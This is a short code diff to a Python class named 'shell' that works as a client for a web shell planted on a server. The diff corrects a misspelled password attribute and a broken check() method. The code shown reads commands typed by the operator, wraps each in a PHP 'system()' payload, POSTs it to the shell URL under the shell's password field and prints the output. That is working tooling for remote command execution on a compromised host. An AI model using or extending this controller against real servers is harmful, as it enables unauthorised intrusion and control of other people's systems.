@@ -5,11 +5,11 @@ class shell:
     def __init__(self, headers, shell_path, shell_password):
         self.headers = headers
         self.path = shell_path
-        self.passwrod = shell_password
+        self.password = shell_password
 
-    def check():
-        print("[*] The shell url: " + shell_path)
-        print("[*] The shell password: " + shell_password)
+    def check(self):
+        print("[*] The shell url: " + self.path)
+        print("[*] The shell password: " + self.password)
 
     def get_mange(self, shell_path, shell_password):
         while 1:
@@ -32,7 +32,7 @@ class shell:
                 command = raw_input("[*] input the command:")
                 payload = 'system("%s");' % command
                 if command != "exit":
-                    postData = {self.passwrod: payload}
+                    postData = {self.password: payload}
                     r = requests.post(self.path, data=postData)
                     print(r.text.encode(r.encoding))
                 else:
